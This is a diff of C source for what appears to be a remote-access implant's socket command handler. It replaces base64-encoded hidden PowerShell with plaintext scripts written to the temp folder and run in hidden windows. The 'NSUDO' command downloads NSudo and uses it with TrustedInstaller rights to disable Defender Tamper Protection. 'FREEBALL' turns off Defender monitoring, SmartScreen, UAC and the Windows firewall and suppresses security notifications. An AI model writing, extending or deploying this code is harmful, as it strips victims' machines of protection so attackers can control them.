@@ -198,12 +198,66 @@ static void handle_admin_command(SOCKET sock, const char *cmd_raw) {
         result = "[Security check complete]";
     }
     else if (strcmp(cmd, "NSUDO") == 0) {
-        const char *ps = "powershell -WindowStyle Hidden -EncodedCommand JHppcCA9IEpvaW4tUGF0aCAkZW52OlRFTVAgJ05TdWRvLnppcCcKJG91dCA9IEpvaW4tUGF0aCAkZW52OlRFTVAgJ05TdWRvJwpJbnZva2UtV2ViUmVxdWVzdCAtVXJpICdodHRwczovL2dpdGh1Yi5jb20vTTJUZWFtQXJjaGl2ZWQvTlN1ZG8vcmVsZWFzZXMvZG93bmxvYWQvOC4yL05TdWRvXzguMl9BbGwuemlwJyAtT3V0RmlsZSAkemlwCkV4cGFuZC1BcmNoaXZlIC1QYXRoICR6aXAgLURlc3RpbmF0aW9uUGF0aCAkb3V0IC1Gb3JjZQokZXhlID0gSm9pbi1QYXRoICRvdXQgJ3g2NFxOU3Vkby5leGUnCmlmIChUZXN0LVBhdGggJGV4ZSkgewogICAgU3RhcnQtUHJvY2VzcyAtRmlsZVBhdGggJGV4ZSAtQXJndW1lbnRMaXN0ICctVTpUJywnLVNob3dXaW5kb3dNb2RlOkhpZGUnLCdyZWcnLCdhZGQnLCdIS0xNXFNPRlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzIERlZmVuZGVyXEZlYXR1cmVzJywnL3YnLCdUYW1wZXJQcm90ZWN0aW9uJywnL3QnLCdSRUdfRFdPUkQnLCcvZCcsJzQnLCcvZicgLVdpbmRvd1N0eWxlIEhpZGRlbiAtV2FpdAogICAgV3JpdGUtSG9zdCAnVGFtcGVyIFByb3RlY3Rpb24gZGlzYWJsZWQnCn0gZWxzZSB7CiAgICBXcml0ZS1Ib3N0ICdOU3Vkby5leGUgbm90IGZvdW5kIGFmdGVyIGV4dHJhY3Rpb24nCn0K";
-        result = sys_run_command(ps);
+        char tempPath[MAX_PATH];
+        GetTempPathA(MAX_PATH, tempPath);
+        char psPath[MAX_PATH];
+        snprintf(psPath, sizeof(psPath), "%s\\nsudo.ps1", tempPath);
+        
+        FILE *f = fopen(psPath, "w");
+        if (f) {
+            fprintf(f, "$zip = Join-Path $env:TEMP 'NSudo.zip'\n");
+            fprintf(f, "$out = Join-Path $env:TEMP 'NSudo'\n");
+            fprintf(f, "Invoke-WebRequest -Uri 'https://github.com/M2TeamArchived/NSudo/releases/download/8.2/NSudo_8.2_All.zip' -OutFile $zip\n");
+            fprintf(f, "Expand-Archive -Path $zip -DestinationPath $out -Force\n");
+            fprintf(f, "$exe = Join-Path $out 'x64\\NSudo.exe'\n");
+            fprintf(f, "if (Test-Path $exe) {\n");
+            fprintf(f, "    Start-Process -FilePath $exe -ArgumentList '-U:T','-ShowWindowMode:Hide','reg','add','HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Features','/v','TamperProtection','/t','REG_DWORD','/d','4','/f' -WindowStyle Hidden -Wait\n");
+            fprintf(f, "    Write-Host 'Tamper Protection disabled'\n");
+            fprintf(f, "} else {\n");
+            fprintf(f, "    Write-Host 'NSudo.exe not found after extraction'\n");
+            fprintf(f, "}\n");
+            fclose(f);
+            
+            char runCmd[MAX_PATH + 64];
+            snprintf(runCmd, sizeof(runCmd), "powershell -WindowStyle Hidden -File \"%s\"", psPath);
+            result = sys_run_command(runCmd);
+        } else {
+            result = "[Failed to write temp script]";
+        }
     }
     else if (strcmp(cmd, "FREEBALL") == 0) {
-        const char *ps = "powershell -WindowStyle Hidden -EncodedCommand U2V0LU1wUHJlZmVyZW5jZSAtRGlzYWJsZVJlYWx0aW1lTW9uaXRvcmluZyAkdHJ1ZQpTZXQtTXBQcmVmZXJlbmNlIC1EaXNhYmxlQmVoYXZpb3JNb25pdG9yaW5nICR0cnVlClNldC1NcFByZWZlcmVuY2UgLURpc2FibGVJT0FWUHJvdGVjdGlvbiAkdHJ1ZQpTZXQtTXBQcmVmZXJlbmNlIC1EaXNhYmxlQmxvY2tBdEZpcnN0U2VlbiAkdHJ1ZQpTZXQtTXBQcmVmZXJlbmNlIC1EaXNhYmxlUHJpdmFjeU1vZGUgJHRydWUKU2V0LU1wUHJlZmVyZW5jZSAtRGlzYWJsZVNjYW5PblJlYWx0aW1lRW5hYmxlICR0cnVlCnJlZyBhZGQgJ0hLTE1cU09GVFdBUkVcUG9saWNpZXNcTWljcm9zb2Z0XFdpbmRvd3MgRGVmZW5kZXInIC92IERpc2FibGVBbnRpU3B5d2FyZSAvdCBSRUdfRFdPUkQgL2QgMSAvZgpyZWcgYWRkICdIS0xNXFNPRlRXQVJFXFBvbGljaWVzXE1pY3Jvc29mdFxXaW5kb3dzIERlZmVuZGVyJyAvdiBEaXNhYmxlUmVhbHRpbWVNb25pdG9yaW5nIC90IFJFR19EV09SRCAvZCAxIC9mCnJlZyBhZGQgJ0hLTE1cU09GVFdBUkVcUG9saWNpZXNcTWljcm9zb2Z0XFdpbmRvd3MgRGVmZW5kZXJcUmVhbC1UaW1lIFByb3RlY3Rpb24nIC92IERpc2FibGVCZWhhdmlvck1vbml0b3JpbmcgL3QgUkVHX0RXT1JEIC9kIDEgL2YKcmVnIGFkZCAnSEtMTVxTT0ZUV0FSRVxQb2xpY2llc1xNaWNyb3NvZnRcV2luZG93cyBEZWZlbmRlclxSZWFsLVRpbWUgUHJvdGVjdGlvbicgL3YgRGlzYWJsZU9uQWNjZXNzUHJvdGVjdGlvbiAvdCBSRUdfRFdPUkQgL2QgMSAvZgpyZWcgYWRkICdIS0xNXFNPRlRXQVJFXFBvbGljaWVzXE1pY3Jvc29mdFxXaW5kb3dzIERlZmVuZGVyXFJlYWwtVGltZSBQcm90ZWN0aW9uJyAvdiBEaXNhYmxlU2Nhbk9uUmVhbHRpbWVFbmFibGUgL3QgUkVHX0RXT1JEIC9kIDEgL2YKcmVnIGFkZCAnSEtMTVxTT0ZUV0FSRVxQb2xpY2llc1xNaWNyb3NvZnRcV2luZG93c1xTeXN0ZW0nIC92IEVuYWJsZVNtYXJ0U2NyZWVuIC90IFJFR19EV09SRCAvZCAwIC9mCnJlZyBhZGQgJ0hLTE1cU09GVFdBUkVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cRXhwbG9yZXInIC92IFNtYXJ0U2NyZWVuRW5hYmxlZCAvdCBSRUdfU1ogL2QgT2ZmIC9mCnJlZyBhZGQgJ0hLTE1cU09GVFdBUkVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cUG9saWNpZXNcU3lzdGVtJyAvdiBFbmFibGVMVUEgL3QgUkVHX0RXT1JEIC9kIDAgL2YKbmV0c2ggYWR2ZmlyZXdhbGwgc2V0IGFsbHByb2ZpbGVzIHN0YXRlIG9mZgpyZWcgYWRkICdIS0xNXFNPRlRXQVJFXFBvbGljaWVzXE1pY3Jvc29mdFxXaW5kb3dzIERlZmVuZGVyXFVYIENvbmZpZ3VyYXRpb24nIC92IE5vdGlmaWNhdGlvbl9TdXBwcmVzcyAvdCBSRUdfRFdPUkQgL2QgMSAvZgpXcml0ZS1Ib3N0ICdBbGwgZG9uZS4gUmVzdGFydCB5b3VyIGNvbXB1dGVyIG5vdy4nIC1Gb3JlZ3JvdW5kQ29sb3IgR3JlZW4K";
-        result = sys_run_command(ps);
+        char tempPath[MAX_PATH];
+        GetTempPathA(MAX_PATH, tempPath);
+        char psPath[MAX_PATH];
+        snprintf(psPath, sizeof(psPath), "%s\\freeball.ps1", tempPath);
+        
+        FILE *f = fopen(psPath, "w");
+        if (f) {
+            fprintf(f, "Set-MpPreference -DisableRealtimeMonitoring $true\n");
+            fprintf(f, "Set-MpPreference -DisableBehaviorMonitoring $true\n");
+            fprintf(f, "Set-MpPreference -DisableIOAVProtection $true\n");
+            fprintf(f, "Set-MpPreference -DisableBlockAtFirstSeen $true\n");
+            fprintf(f, "Set-MpPreference -DisablePrivacyMode $true\n");
+            fprintf(f, "Set-MpPreference -DisableScanOnRealtimeEnable $true\n");
+            fprintf(f, "reg add 'HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender' /v DisableAntiSpyware /t REG_DWORD /d 1 /f\n");
+            fprintf(f, "reg add 'HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender' /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f\n");
+            fprintf(f, "reg add 'HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection' /v DisableBehaviorMonitoring /t REG_DWORD /d 1 /f\n");
+            fprintf(f, "reg add 'HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection' /v DisableOnAccessProtection /t REG_DWORD /d 1 /f\n");
+            fprintf(f, "reg add 'HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection' /v DisableScanOnRealtimeEnable /t REG_DWORD /d 1 /f\n");
+            fprintf(f, "reg add 'HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\System' /v EnableSmartScreen /t REG_DWORD /d 0 /f\n");
+            fprintf(f, "reg add 'HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer' /v SmartScreenEnabled /t REG_SZ /d Off /f\n");
+            fprintf(f, "reg add 'HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System' /v EnableLUA /t REG_DWORD /d 0 /f\n");
+            fprintf(f, "netsh advfirewall set allprofiles state off\n");
+            fprintf(f, "reg add 'HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\UX Configuration' /v Notification_Suppress /t REG_DWORD /d 1 /f\n");
+            fprintf(f, "Write-Host 'All done. Restart your computer now.' -ForegroundColor Green\n");
+            fclose(f);
+            
+            char runCmd[MAX_PATH + 64];
+            snprintf(runCmd, sizeof(runCmd), "powershell -WindowStyle Hidden -File \"%s\"", psPath);
+            result = sys_run_command(runCmd);
+        } else {
+            result = "[Failed to write temp script]";
+        }
     }
     else if (strcmp(cmd, "PROTECT_PROCESS") == 0 || strcmp(cmd, "DEPLOY_SVC") == 0) {
         sys_spawn_shadow_copy();
